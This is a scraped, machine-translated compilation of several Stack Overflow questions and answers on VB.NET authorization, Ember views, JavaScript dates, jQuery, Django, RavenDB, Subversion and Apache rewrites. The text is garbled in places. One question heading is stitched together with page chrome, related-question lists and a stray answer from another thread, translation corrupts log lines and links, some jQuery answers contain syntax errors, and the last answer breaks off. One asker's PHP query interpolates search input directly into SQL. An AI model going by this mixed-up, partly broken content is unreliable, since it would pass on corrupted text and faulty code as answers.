    Dim db As UserProfileDbContext = New UserProfileDbContext
    Dim profile = db.UserProfiles.Where(Function(x) x.UserId = user.ProviderUserKey).Single

    ' TODO: if user doesn't have a profile, return false

    ' get route
    Dim routeData = httpContext.Request.RequestContext.RouteData

    ' get controller
    Dim controller = routeData.Values("controller").ToString

    ' get id
    Dim id = routeData.Values("id").ToString

    ' if no id is set, check to see if the user owns the requested entity (company or blog)
    If String.IsNullOrEmpty(id) = True Then

        If controller.ToLower = "blog" Or controller.ToLower = "article" Then

            If profile.IsCompanyOwner Or profile.IsBlogOwner = True Then

                ' if user is owner of a blog with no specified id, then it will default to their own blog
                Return True

            End If

        End If

    Else

        ' if controller = blog
        '       check for blog id

        If controller.ToLower = "blog" Then

            ' check to see if the user owns the company to which the blog belongs
            If profile.IsCompanyOwner Then

                ' get company from blog id
                Dim db1 As BlogDbContext = New BlogDbContext
                Dim blog = db1.Blogs.Where(Function(b) b.BlogId = id).Single()

                If blog.CompanyId = profile.CompanyId Then

                    Return True

                End If

            ElseIf profile.IsBlogOwner Then

                ' if user's blog id is the blog being requested, grant access
                If profile.BlogId = id Then

                    Return True

                End If

            End If

        End If

        ' if controller = article
        '       check for article blog id

        If controller.ToLower = "article" Then

            Dim db2 As ArticleDbContext = New ArticleDbContext
            Dim article = db2.Articles.Where(Function(a) a.ArticleId = id).Single
            Dim articleBlogId = article.BlogId

            ' check to see if the user owns the company to which the blog belongs
            If profile.IsCompanyOwner Then

                ' get company from blog id
                Dim db1 As BlogDbContext = New BlogDbContext
                Dim blog = db1.Blogs.Where(Function(b) b.BlogId = articleBlogId).Single()

                If blog.CompanyId = profile.CompanyId Then

                    Return True

                End If

            ElseIf profile.IsBlogOwner Then

                ' if user's blog id is the blog being requested, grant access
                If profile.BlogId = articleBlogId Then

                    Return True

                End If

            End If

        End If

    End If

    ' if we got this far, then the user shouldn't have access
    Return False

End Function

Protected Overrides Sub HandleUnauthorizedRequest(filterContext As AuthorizationContext)
    Dim result = New ViewResult()
    result.ViewName = "Error"
    result.ViewBag.ErrorMessage = "oops, you are not allowed"
    filterContext.Result = result
End Sub 
```

结束类

我该如何解决这个错误？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:40:52.263

我想你想打电话给`MyBase.AuthorizeCore`.

所以你想改变这条线

```
Dim authorized = AuthorizeCore(httpContext) 
```

至

```
Dim authorized = MyBase.AuthorizeCore(httpContext) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:42:00.080

你的函数的第一行是`Dim authorized = AuthorizeCore(httpContext)`

该行将再次调用您的方法，并且该新调用的第一行将执行相同的操作，直到无限期。这会导致`StackOverflowException`.

# javascript - Ember ContainerView 不更新计算属性

> ID：11847263
> 
> 赞同：0
> 
> 时间：2012-08-07T13:39:11.487
> 
> 标签：javascript, ember.js, handlebars.js

我正在尝试使用 childViews 计算属性制作 ContainerView，这取决于控制器。问题是，当控制器的内容更改时，该属性不会更新（当另一个依赖属性更改时它也不会更新）。请告诉我我做错了什么......

示例：http: [//jsfiddle.net/frZ3a/5/](http://jsfiddle.net/frZ3a/5/)

Javascript：

```
App = Em.Application.create({});

App.controller = Em.ArrayController.create({
    reversed: false,
    content: [],
    init: function() {
        var c = this;
        function addContent() {
            if (c.get('content').length < 10) {
                c.get('content').push(c.get('content').length);
                setTimeout(addContent, 1000);
                console.log(c.get('content'));
            }
        }

        addContent();
        return this._super();
    }
});

App.TestView = Em.View.extend({
    templateName: 'single',
    number: null        
})

Em.ContainerView.create({
    templateName: 'test',
    tagName: 'div',
    controller: App.controller,
    reversedBinding: 'controller.reversed',

    childViews: function() {
        var result = this.get('controller.content').map(function(el) {
            return App.TestView.extend({number: el});
        });
        if (this.get('reversed')) {
            result.reverse();
        }
        return result;
    }.property('controller.content.@each', 'reversed')

}).append();

Em.View.create({
    templateName: 'reverse',
    controller: App.controller,
    reversedBinding: 'controller.reversed',

    reverseContent: function() {
        this.set('reversed', !this.get('reversed'));
    }
}).append(); 
```

html:

```
<script type="text/x-handlebars" data-template-name="single">
    Single view: {{view.number}}
</script>

<script type="text/x-handlebars" data-template-name="reverse">
    <a {{action reverseContent}}>Reverse</a>
</script> 
```

​ ​</p>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:52:59.423

这是一个*（工作）*改进版本：http: [//jsfiddle.net/MikeAski/Qg3uW/](http://jsfiddle.net/MikeAski/Qg3uW/)

***编辑***

与您的一些有趣的细微差别...... :-)

*   使用`CollectionView`代替`each`助手，
*   用于`toggleProperty`布尔切换，
*   *等等*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:46:27.310

由于 ContainerView，该示例似乎无法正常工作。当我稍作改动时：http: [//jsfiddle.net/frZ3a/18/](http://jsfiddle.net/frZ3a/18/)

并将视图更改为常规的 Ember.View，将内容属性绑定到控制器的内容，它开始工作得很好。我猜这是由于 Ember.ContainerView 的实现不同造成的。

# javascript - getMonth getUTCMonth 差异结果

> ID：11847269
> 
> 赞同：6
> 
> 时间：2012-08-07T13:39:42.467
> 
> 标签：javascript

使用 JavaScript date.getMonth() 和 date.getUTCMonth() 时，我发现结果不一致，但仅限于某些日期。以下示例演示了该问题：

```
<!DOCTYPE html>
<html>
<body onload="myFunction()">

<p id="demo">Click the button to display the month</p>

<script type="text/javascript">
function myFunction()
{
var d = new Date(2012, 8, 1);
var x = document.getElementById("demo");
x.innerHTML=d;
x.innerHTML+='<br/>result: ' + d.getMonth();
x.innerHTML+='<br/>result UTC: ' + d.getUTCMonth();

}
</script>

</body>
</html> 
```

这个例子的输出是：

```
Sat Sep 01 2012 00:00:00 GMT+0100 (Hora de Verão de GMT)
result: 8
result UTC: 7 
```

如果我将日期更改为 (2012, 2, 1)，则输出为：

```
Thu Mar 01 2012 00:00:00 GMT+0000 (Hora padrão de GMT)
result: 2
result UTC: 2 
```

在第一个示例中，getMonth 返回 7，getUTCMonth 返回 8。在第二个示例中，两者都返回相同的值 2。

有没有人已经经历过这种情况？我来自葡萄牙，我认为这与我的格林尼治标准时间有关，但我不明白为什么会发生这种情况，因为这些示例是在相同的情况下运行的。

提前感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-06-10T06:54:16.120

通用时区日期方法用于处理 UTC 日期

日期返回 0 到 11 之间的月份新日期（1976 年 1 月 1 日 18 日） - 1976 年 2 月 18 日星期三 00:00:00 GMT+0530（印度标准时间）

*getUTCDate 返回与 getDate() 相同，但返回基于世界时区的日期，与月份和年份相同

新日期(1976, 01, 18).getUTCDate() - 17

新日期(1976, 01, 18).getDate() - 18

新日期(1976, 02, 18).getUTCMonth() - 2

新日期(1976, 01, 18).getMonth() - 1

新日期(1976, 01, 18).getYear() - 76

新日期(1976, 01, 18).getUTCFullYear() - 1976

新日期(1976, 01, 18).getFullYear() - 1976

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:55:46.913

你会发现它是由 DST 差异引起的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-10-17T14:40:49.580

您会看到，根据您的 TIMEZONE，控制台日志可能会有所不同。我选择了当月的第一天'01'，因为它将被赋予午夜默认时间'00:00:00'，这将导致某些时区产生二月而不是三月（你可以在这里获得完整的独家新闻：[https：/ /developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/parse](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/parse)）：

```
let date1 = '2019-03-01'; // defaults to UTC
let date2 = '2019-03-01T14:48:00'; // LOCAL date/time

let dt1 = new Date(date1);
let dt2 = new Date(date2)

let month1 = dt1.getMonth();
let month2 = dt2.getMonth();

console.log("mon1: " + month1);
console.log("mon2: " + month2); 
```

# content-management-system - Umbraco：向用户/用户类型添加字段

> ID：11847272
> 
> 赞同：1
> 
> 时间：2012-08-07T13:39:45.057
> 
> 标签：content-management-system, umbraco

扩展用户区域的最佳方式是什么？我想在用户类型中添加一个字段，您必须在其中为每个特定类型选择一个管理员（按用户类型）。我没有看到任何扩展这个区域的方法，是否必须在源代码中完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T19:04:27.233

无法扩展用户以添加我知道的更多属性。您可以在 Umbraco 数据库中创建一个新表，然后使用 XLST 扩展或 C# 类在 Razor 宏或用户控件中获取扩展属性. 但是，您必须在用户部分（或自定义部分）中创建一个自定义文件夹，以允许在 Umbraco 中编辑扩展属性。

# javascript - 根据另一个 id 和类名将 display:none 应用于 div id

> ID：11847273
> 
> 赞同：0
> 
> 时间：2012-08-07T13:39:45.930
> 
> 标签：javascript, jquery

有点卡住，

如何根据另一个类名隐藏另一个类？

如果我的切换 div id 有一类 hide-me `<div id="toggleDiv" class="hide-me"></div>`

然后我想将 display-none 应用于`div#footer_toggle`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T13:41:32.777

```
if($("#toggleDiv").hasClass("hide-me")) {
  $("#footer_toggle").hide()
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:42:45.663

简单的：

```
 if($('#toggleDiv').hasClass('hide-me'){
    $('#footer_toggle').hide():
 } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T13:42:47.530

尝试这个，

```
if('#toggleDiv').hasClass('hide-me'))
{
     $('div#footer_toggle').css('display', 'none');
} 
```

或者

```
if('#toggleDiv').hasClass('hide-me'))
{
     $('div#footer_toggle').hide();
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T13:43:07.100

```
if($('#toggleDiv').hasClass('hide-me')) {
  $('#footer_toggle').css('display', 'none');
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-07T13:44:00.547

您可以将 .hasclass 与 jquery 一起使用

```
if ($('#toggleDiv').hasClass('hide-me')){
    $('#footer_toggle').css({'display':'none'});
} 
```

希望有帮助。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-07T13:46:39.213

只需执行此[切换（）](http://api.jquery.com/toggle/)

```
 $('#footer_toggle').toggle($('#toggleDiv').hasClass('hide-me'));
 // by passing in a boolean to toggle() it will hide/show an element 
```

# c# - C#获取异常之前位于堆栈顶部的对象

> ID：11847275
> 
> 赞同：0
> 
> 时间：2012-08-07T13:39:56.570
> 
> 标签：c#, exception, stack

我正在用 C# 创建一种解释性编程语言（有点像 lulz，除了玩得开心和了解编译器之外没有真正的目的），但遇到了问题。在我的词法分析器中，我记得令牌在原始文件中的位置，以提供更有用的调试错误。我保留这个“TokenPosition”对象，在程序通过编译步骤时将其复制，直到它结束在运行解释代码的同一个对象中（例如，我的命名变量的“标识符”类有一个 TokenPosition 成员）。

我的问题：如果抛出异常，我想查看堆栈，找到具有 TokenPosition 成员的最顶层对象，并打印其位置。或者，更一般地说，“我如何在异常发生后获取堆栈中的对象？这甚至可能吗？” （我可以检查它是否有一个 TokenPosition 对象/很容易得到它，我不是在问怎么做）

我不想做的最后手段：每次调用行为（经常发生）都会在 this.tokenPosition 的某处分配一个静态 tokenPosition 变量。我也可以用 try/catchs 包围一切，但同样，我真的不想这样做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:56:16.157

方法的参数是短暂的。当它们不再存在时，它们可能被局部变量覆盖，或者被 JIT 编译器优化为未使用，甚至[在方法运行时被](http://blogs.msdn.com/b/oldnewthing/archive/2010/08/10/10048149.aspx)垃圾收集。您必须自己跟踪此信息，例如，通过为“当前活动对象”提供一个单独的堆栈数据结构，该结构会自动由`using`子句展开。

# django - Django 表单：如何向 field_content 添加类？

> ID：11847276
> 
> 赞同：0
> 
> 时间：2012-08-07T13:39:55.753
> 
> 标签：django, django-forms

当我呈现一个表单时，它会为每个字段生成类似这样的内容：

```
<div class="field_content">
    <label>...</label>
    <div class="field">...</class>
</div> 
```

我希望能够唯一标识样式表中的每个字段。有没有办法向外部 div（除了 field_content）或外部 div（field_content 的父级）添加另一个类？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:14:15.887

如果设置字段的类就足够了，您可以将其指定为[小部件的属性](https://docs.djangoproject.com/en/dev/ref/forms/widgets/#customizing-widget-instances)：

```
name = forms.CharField(widget=forms.TextInput(attrs={'class':'special'})) 
```

如果您需要更多控制，最好[手动呈现表单，](https://docs.djangoproject.com/en/dev/topics/forms/?from=olddocs#customizing-the-form-template)或者如果您不介意依赖外部应用程序，则可以使用更灵活的解决方案：

在[django-floppyforms](http://django-floppyforms.readthedocs.org/en/latest/index.html)中，您可以使用[`form layouts`](http://django-floppyforms.readthedocs.org/en/latest/layouts.html#using-form-layouts)，在[django-crispy-forms](http://django-crispy-forms.readthedocs.org)中，您可以使用[`layout objects`](http://django-crispy-forms.readthedocs.org/en/d-0/layouts.html#universal-layout-objects)并实现您想要的。

# c# - 2位小数的数据类型？

> ID：11847278
> 
> 赞同：0
> 
> 时间：2012-08-07T13:40:07.150
> 
> 标签：c#, .net, ado.net

我应该使用哪种数据类型来给我一个小数点后 2 位的数字？

我目前有以下行：

```
command.Parameters.Add("@miles", SqlDbType.Decimal, 2).Value = miles; 
```

我不确定`SqlDbType.Decimal, 4`小数位是什么意思？

是否允许以下

```
123.32
123321.67 
```

并且不允许像

```
123
123.123321
543345.5434523
324.1 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:47:41.480

因为`decimal`您需要指定参数的精度和比例。

您可以通过构造参数（使用`new`）并添加它来做到这一点。

MSDN 页面中的最后两个构造函数重载[`SqlParameter`](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparameter.aspx)具有精度和比例参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:47:03.663

您好，您可以尝试使用 Scale 来格式化您的参数

```
 SqlParameter parameter = new SqlParameter("miles", SqlDbType.Decimal);
 parameter.Scale = 2; //The number of positions

http://msdn.microsoft.com/fr-fr/library/system.data.sqlclient.sqlparameter.scale.aspx 
```

# iis - Umbraco 网站和 IIS 日志记录

> ID：11847282
> 
> 赞同：1
> 
> 时间：2012-08-07T13:40:20.207
> 
> 标签：iis, logging, azure, dns, umbraco

如果内存服务正确，我在 Azure 云中有一个 Umbraco 实例，v4.7。我需要利用 IIS 日志记录来获取网站使用统计信息，但似乎有一个限制。

我有多个不同的网站，都使用各种网站模板，但 IIS 日志似乎没有输出域名。如何让 IIS 输出域名？

以下是当前 IIS 日志捕获的示例（我知道这是一个爬取网页的 BOT，但我有真正的流量但无法识别访问的是哪个网站）：

2012-08-06 00:11:54 10.61.52.73 GET /insurance/insurance/ - 80 - 46.4.38.67 InnovantageBot/1.0+(http://www.innovantage.co.uk/technology/webmaster_information.htm) 200 0 0 390 2012-08-06 00:11:55 10.61.52.73 GET /insurance/reason/ - 80 - 46.4.38.67 InnovantageBot/1.0+(http://www.innovantage.co.uk/technology/webmaster_information.htm) 200 0 0 578 2012-08-06 00:11:55 10.61.52.73 获取 /insurance/type/ - 80 00:11:55 10.61.52.73 获取 /life/qa/ - 80 - 46.4.38.67 InnovantageBot/1.0+( http://www.innovantage.co.uk/technology/webmaster_information.htm) 200 0 0 359 2012-08-06 00:11:55 10.61.52.73 GET /life/reasons/ - 80 - 46.4.38.67 InnovantageBot/1.0 +(http://www.innovantage.co.uk/technology/webmaster_information.htm) 200 0 0 328 2012-08-06 00:11:57 10.61.52.73 GET /insurance/glossary/ - 80 - 46.4.38.67 InnovantageBot /1.0+(http://www.innovantage.co.英国/技术/webmaster_information.htm）200 0 0 374

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:57:41.510

在您的 WebRole.cs 中，您可以调整 IIS 和在 IIS 中运行的每个站点。您可以选择应记录哪些字段，我认为您正在寻找该`LogExtFileFlags.Host`字段：

```
using (var manager = new ServerManager())
{
    var siteName = RoleEnvironment.CurrentRoleInstance.Id + "_Web";
    var site = manager.Sites[siteName];
    site.LogFile.LogExtFileFlags |= LogExtFileFlags.Host;
    manager.CommitChanges();
} 
```

确保您的角色在提升模式下运行，在您的**ServiceDefinition.csdef**文件中进行更改：

```
<Runtime executionContext="elevated" /> 
```

您还应该能够使用**appcmd.exe**更改此设置：

[http://www.iis.net/ConfigReference/system.applicationHost/sites/siteDefaults/logFile#005](http://www.iis.net/ConfigReference/system.applicationHost/sites/siteDefaults/logFile#005)

# php - 加权 mysql 结果来自匹配 3 个表中的 2 个列（第 3 个是连接表）

> ID：11847285
> 
> 赞同：1
> 
> 时间：2012-08-07T13:40:28.210
> 
> 标签：php, mysql, search, full-text-search

好的，我会尽力解释清楚。我不知道下一步该做什么。我正在构建一个 DAM（数字资产管理器）。我有一个资产表、一个标签表和一个要加入 2 的资产表。这是我的搜索查询：

```
 SELECT a.*
    FROM assets a, tags t, asset_tags at
    WHERE 1*MATCH (a.notes) AGAINST ('{$searchQuery}' IN BOOLEAN MODE)
    UNION
    SELECT a.*
    FROM assets a, tags t, asset_tags at
    WHERE 2*MATCH (t.name) AGAINST ('{$searchQuery}' IN BOOLEAN MODE)
    AND at.tag_id = t.id
    AND a.id = at.asset_id
    GROUP BY a.id 
```

给定资产：

资产1：标签=福特，描述=“不像融合……”
资产2：标签=现代，描述=“这种颜色是融合……”
资产3：标签=福特，描述=“”
资产4：标签=福特，融合；description = "这辆福特 Fusion 有..."

搜索“ford Fusion”，根据上述查询中应用的权重，顺序应为：4,1,3,2

相反，我得到 1,2,4,3。我猜这是因为我按 a.id 分组，所以它没有添加标签在特定资产上被索引的次数。它也没有将两个查询放在一起。

我正在考虑拥有一千个或更少的标签，但资产多达一百万。我想让事情尽可能高效。

我接下来要去哪里？我缺少这个难题的一部分吗？

# ravendb - 未找到在 RavenDB 中删除索引

> ID：11847289
> 
> 赞同：1
> 
> 时间：2012-08-07T13:40:35.977
> 
> 标签：ravendb

我正在尝试为多租户 ravendb 编写一个通用删除函数，用于集成测试该类是 -

```
public class RavenDeleteAll
{
    private readonly IDocumentStore _store;
    private readonly string _testDataBase;

    public RavenDeleteAll(string testDataBase, IDocumentStore store)
    {
        _testDataBase = testDataBase;
        _store = store;
    }

    public void Clear<T>(string indexName)
    {
        using (var session = _store.OpenSession(_testDataBase))
        {
            session.Advanced.DocumentStore.DatabaseCommands.DeleteIndex(indexName);

            session.Advanced.DocumentStore.DatabaseCommands.PutIndex(indexName, new IndexDefinitionBuilder<T>
                                                                                        {
                                                                                            Map = documents => documents.Select(entity => new { })
                                                                                        });
            var indexDefinition = session.Advanced.DocumentStore.DatabaseCommands.GetIndex(indexName);
            session.Advanced.LuceneQuery<T>(indexName)
           .WaitForNonStaleResultsAsOfNow()
           .Take(0)
           .ToList();

            session.Advanced.DatabaseCommands.DeleteByIndex(indexName, new IndexQuery());

        }

    }
} 
```

请注意，在代码中，我尝试在 putindex 调用后读回索引以进行完整性检查。但是当我执行索引时，它会抛出一个无效操作异常，说明 /indexes/UTO 不存在？

同样从管理控制台我可以清楚地看到索引 - ![在此处输入图像描述](../Images/3bafe7d8658dfd684375d0be79cee258.png)

我不做什么？另外索引是在默认数据库下创建的，而不是实际的数据库名称？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T16:48:30.227

看起来您是在默认数据库而不是租户数据库中创建索引，然后向租户数据库询问该索引。您需要在要使用它的数据库中创建索引。以下内容未经测试，但应适用于在租户数据库中创建索引。

```
IDatabaseCommands context = session.Advanced.DocumentStore.DatabaseCommands.ForDatabase(database);
context.PutIndex(indexName, new IndexDefinitionBuilder<T>
    {
        Map = documents => documents.Select(entity => new { })
    }); 
```

# serial-port - 尝试在vb2008中测试串口通信时出现“参数提示无法转换为字符串错误”

> ID：11847291
> 
> 赞同：0
> 
> 时间：2012-08-07T13:40:39.957
> 
> 标签：serial-port

我正在使用以下代码发送一些数据并接收它，但我收到以下错误。我在 vb 中使用 Visual Studio 2008 编码

**参数提示无法转换为字符串错误**

```
Dim byteBuffers(2) As Byte

byteBuffers(0) = 8
byteBuffers(1) = 3
byteBuffers(2) = 6

rs232port.Write(byteBuffers, 0, 3)

Dim byteBuffer() As Byte = {0, 0, 0}
rs232port.Read(byteBuffer, 0, 3)
MsgBox(byteBuffer) 
```

有人可以解释导致我的错误的原因吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T15:35:20.367

第一个错误：您的代码不是 VBScript，因此请删除该标签并选择一个适合您使用的方言的标签。

第二个错误：`MsgBox`期望一个字符串（或可以转换为字符串的东西）作为第一个参数；你的 byteBuffer 既不是也不是。

# c# - 如何转换列表 to unique id Possible Duplicate: Good GetHashCode() override for List of Foo obj 问问题 问问题 2012-08-07T13:40:41.903 261 次 This question shows research effort; it is useful and clear 1 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. Possible Duplicate: Good GetHashCode() override for List of Foo objects I have List of Objects, Object has ID, FileName, Status(Enumerator), DateStamp, UserId. Using Linq I filter List using UserId and send it to Web App. I need to get some kind of Unique Id for filtered result and compare it next time to detect changes for current user. If new Object added for current user or property of existing object is changed Unique Id should be different. I have tried to use code below to get Hash Code but hash code is different for every myList object even objects and object properties are the same. Any ideas please? myList= _queueList.GetItems(p => p.User.Id == userId) .OrderByDescending(p => p.DateStamp) .ToList(); myList.GetHashCode() I think you want to call the MyBase.AuthorizeCore. So you want to change this line Dim authorized = AuthorizeCore(httpContext) to Dim authorized = MyBase.AuthorizeCore(httpContext) c#list 4 2 回答 2 This answer is useful 1 var uniqueId = string.Join(",", myList.Select(x=>x.Id.ToString()).ToArray()); 如果字符串很长，您可以生成一个 md5 或 sha1 并返回它。 于 2012-08-07T13:48:39.730 回答 This answer is useful 1 您可以像这样利用内置密码学： string hash = Convert.ToBase64String( new SHA1CryptoServiceProvider().ComputeHash( Encoding.UTF8.GetBytes( string.Join(":", myList.Select(obj => obj.Id.ToString()).ToArray() ))); 我Convert.ToBase64String()让它对网络友好（注意：如果你有很多记录，结果字符串可能会变得很长！） 于 2012-08-07T13:51:42.270 回答 Related 5 c# - 如果值在前一条记录中，则在 linq 查询中选择 null 6 iphone - 在 iOS 7 中为 UITableViewCell 使用背景视图涵盖了默认删除按钮 1 php - 从 PHP 中的多个下拉菜单中获取价值 4 sql - GRANT EXECUTE 和跨数据库引用在 SQL Server 中如何工作？ 1 jquery - 清除时间jquery的值 0 android - 将变量从 Activity 发送到 GLSurfaceView 类以进行片段着色器输入 1 java - InputStreamReader 应该与 appendCodePoint 一起使用吗？ 2 qt - QFileDialog：如何设置选项以在 getExistingDirectory() 中显示文件夹内容 4 php - PHP $_POST 限制 2 c# - 字符串包含时的子字符串，Linq 语法 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：11847294
> 
> 赞同：1
> 
> 时间：
> 
> 标签：c#, list

> **Possible Duplicate:**
> [Good GetHashCode() override for List of Foo objects](https://stackoverflow.com/questions/8094867/good-gethashcode-override-for-list-of-foo-objects)

I have `List` of `Objects`, Object has ID, FileName, Status(Enumerator), DateStamp, UserId.
Using `Linq` I filter `List` using `UserId` and send it to Web App.

I need to get some kind of `Unique Id` for filtered result and compare it next time to detect changes for current user. If new Object added for current user or property of existing object is changed `Unique Id` should be different.

I have tried to use code below to get Hash Code but hash code is different for every myList object even objects and object properties are the same. Any ideas please?

```
myList= _queueList.GetItems(p => p.User.Id == userId)
                  .OrderByDescending(p => p.DateStamp)
                  .ToList();

myList.GetHashCode() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:48:39.730

```
var uniqueId = string.Join(",", myList.Select(x=>x.Id.ToString()).ToArray()); 
```

如果字符串很长，您可以生成一个 md5 或 sha1 并返回它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:51:42.270

您可以像这样利用内置密码学：

```
string hash = Convert.ToBase64String(
    new SHA1CryptoServiceProvider().ComputeHash(
        Encoding.UTF8.GetBytes(
            string.Join(":", myList.Select(obj => obj.Id.ToString()).ToArray()
        ))); 
```

我`Convert.ToBase64String()`让它对网络友好（注意：如果你有很多记录，结果字符串可能会变得很长！）

# apache - TortoiseSVN Can't Authenticate

> ID：11847296
> 
> 赞同：4
> 
> 时间：2012-08-07T13:40:52.150
> 
> 标签：apache, svn, authentication, tortoisesvn, sasl

After my previous problem, [TortoiseSVN Can't Connect](https://stackoverflow.com/questions/11820835/tortoisesvn-cant-connect "TortoiseSVN Can't Connect") was resolved, I ran into a new problem. On the linux server hosting my svn repository, in the repository's directory, there is a `conf/svnserve.conf` file. In this file, I have the option:

```
anon-access = none | read | write 
```

Initially, this line was commented out and the default value must have been `read`. Of course, I want to set `anon-access = none`, and I want `auth-access = write` (which is the default).

But when I set `anon-access = none`, when I try to browse with **TortoiseSVN Repository Browser** using url `svn://host:port/repositoryname`, I get the error:

> Unable to connect to a repository at URL 'svn://host:port/repositoryname' No access allowed to this repository

I'd like to successfully authenticate without ssh if possible, because I gather ssh has more moving parts and might be a little slower.

The server is **CloudLinux Server release 5.8**

The svn server information follows. I have only tried svn protocol so far.

> svn, version 1.6.17 (r1128011) compiled Jul 26 2012, 03:59:19
> 
> Copyright (C) 2000-2009 CollabNet. Subversion is open source software, see [http://subversion.apache.org/](http://subversion.apache.org/) This product includes software developed by CollabNet ([http://www.Collab.Net/](http://www.Collab.Net/)).
> 
> The following repository access (RA) modules are available:
> 
> *   ra_neon : Module for accessing a repository via WebDAV protocol using Neon.
>     *   handles 'http' scheme
> *   ra_svn : Module for accessing a repository using the svn network protocol.
>     *   with Cyrus SASL authentication
>     *   handles 'svn' scheme
> *   ra_local : Module for accessing a repository on local disk.
>     *   handles 'file' scheme
> *   ra_serf : Module for accessing a repository via WebDAV protocol using serf.
>     *   handles 'http' scheme
>     *   handles 'https' scheme

I hope this is a good question because this is kind of the "out of the box" behavior connecting to svn with windows, which might be pretty common when someone adds svn to a shared hosting account.

Thank you!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T19:47:01.310

在 svnserve.conf 文件中设置这些行：

```
 19 anon-access = none
 20 auth-access = write
    [...]
 27 password-db = passwd
    [...]
 39 realm = Name-of-your-repository
 46 force-username-case = lower 
```

行号是近似值。

`realm`应该等于您的存储库的名称。它可以是任何东西。`password-db`是有权使用存储库的人。默认情况下，该行是 NOPed out。

接下来，您将编辑`passwd`同一目录中的文件。格式非常简单：

```
 <userName> = <password> 
```

有两个 NOPed 条目向您展示了它是如何完成的。

# javascript - 跟踪库中的 Javascript 警告

> ID：11847305
> 
> 赞同：0
> 
> 时间：2012-08-07T13:41:26.183
> 
> 标签：javascript

我有一个使用 Raphaël 的脚本，这是一个用于处理 SVG 的 Javascript 库。在我的代码中，我做错了，因为我收到了来自库的警告。

该警告来自图书馆中的某行。从该警告发生时跟踪堆栈以了解我的代码中导致警告的行是很好的。

使用 console.trace 没有帮助，所以我问，有没有办法跟踪来自 Javascript 库的警告？

（PS：我考虑修改库以打印堆栈跟踪，但这太难了。）

编辑：

警告本身是：

“意外的值 NaN 解析宽度属性。”

我想跟踪错误以了解我在我的代码中将 NaN 发送到 Raphael 函数的位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T13:45:10.530

如果我是对的，当您尝试创建路径时，您的警告可能类似于“无效的语法 M,0,0”（欢迎提供更多详细信息）？

如果是，那么你就不能有堆栈跟踪，因为它是一个 SVG 错误（SVG 引擎告诉你一个 DOM SVG 元素是错误的，但它不会告诉你这个节点是什么时候创建的）。

检查您正在使用 Raphael 创建的元素中的输入。

# php - Apache mod_rewrite 模块问题

> ID：11847308
> 
> 赞同：1
> 
> 时间：2012-08-07T13:41:27.563
> 
> 标签：php, apache, .htaccess, mod-rewrite

我的 .htaccess 中有以下代码。

```
RewriteEngine On
RewriteRule ^/(\w+)/?$ /?user=$1 
```

我正在尝试将 [http://domain.com/?user=username](http://domain.com/?user=username)重写为[http://domain.com/username](http://domain.com/username)。不幸的是，这段代码没有重写任何东西。请帮忙

注意：我检查`phpinfo()`并加载了 mod_rewrite。

**更新**

我需要从像[http://facebook.com/username](http://facebook.com/username)这样的 url 获取用户名。但是这段代码重写了根文件夹中的每个文件夹，所以我的 /css 文件夹变成了[http://domain.com/css/?u=common](http://domain.com/css/?u=common)。如何允许此代码仅适用于[http://domain.com/index.php](http://domain.com/index.php)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:56:15.387

您正在做的错误是`/`在行首使用`^/(\w+)/?$`

`/`重写规则从要匹配的模式的开头`.htaccess`和目录上下文中剥离。

尝试这样做：

```
RewriteEngine On
RewriteRule ^(\w+)/?$ /?user=$1 
```

来自[RewriteRule 指令^(文档)](http://httpd.apache.org/docs/2.2/mod/mod_rewrite.html#rewriterule)：

> 什么是匹配的？
> 
> 在 VirtualHost 上下文中，Pattern 最初将与 URL 的主机名和端口之后以及查询字符串之前的部分进行匹配（例如“/app1/index.html”）。
> 
> 在 Directory 和 htaccess 上下文中，模式最初将与文件系统路径匹配，在删除引导服务器到当前 RewriteRule 的前缀之后（例如“app1/index.html”或“index.html”，具体取决于指令的位置定义）。
> 
> 如果您希望匹配主机名、端口或查询字符串，请分别使用带有 %{HTTP_HOST}、%{SERVER_PORT} 或 %{QUERY_STRING} 变量的 RewriteCond。
> 
> * * *

编辑：根据 OP 的要求更新答案：添加：

```
RewriteEngine On

#do nothig if URL is trying to access the folder CSS.
RewriteRule *css/* - [L]

#checks where the URL is a valid file/folder.
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
